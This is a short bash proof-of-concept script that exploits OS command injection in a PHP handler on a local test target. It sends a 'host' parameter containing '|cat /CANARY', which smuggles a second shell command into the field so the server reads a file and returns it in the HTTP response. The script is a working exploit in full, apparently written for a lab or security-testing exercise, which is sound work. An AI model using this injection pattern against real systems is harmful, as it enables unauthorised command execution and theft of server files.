#!/usr/bin/env bash
# PoC: OS command injection in shakedown target (127.0.0.1:8181)
# Vulnerable param: host (GET), passed unsanitized to a shell command
# by index.php's act=preview handler. Payload "|cat /CANARY" appends
# an injected command whose output is returned in the HTTP body.
set -euo pipefail
TARGET="http://127.0.0.1:8181/"
curl -s -G "${TARGET}" --data-urlencode "act=preview" --data-urlencode "host=|cat /CANARY"
